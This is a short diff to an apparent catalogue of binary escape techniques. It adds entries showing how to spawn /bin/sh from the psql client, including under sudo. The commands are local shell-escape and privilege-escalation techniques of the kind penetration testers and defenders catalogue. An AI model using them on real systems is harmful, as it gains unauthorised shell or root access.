@@ -2,14 +2,26 @@
   "functions": {
     "shell": [
       {
-        
+        "description": "",
         "code": "psql\n\\?\n!/bin/sh\n"
+      },
+      {
+        "description": "",
+        "code": "psql\n\\! /bin/sh\n"
       }
     ],
     "sudo": [
       {
-        
+        "description": "",
         "code": "psql\n\\?\n!/bin/sh\n"
+      },
+      {
+        "description": "",
+        "code": "psql\n\\! /bin/sh\n"
+      },
+      {
+        "description": "",
+        "code": "sudo psql\n\\?\n!/bin/sh\n"
       }
     ]
   }
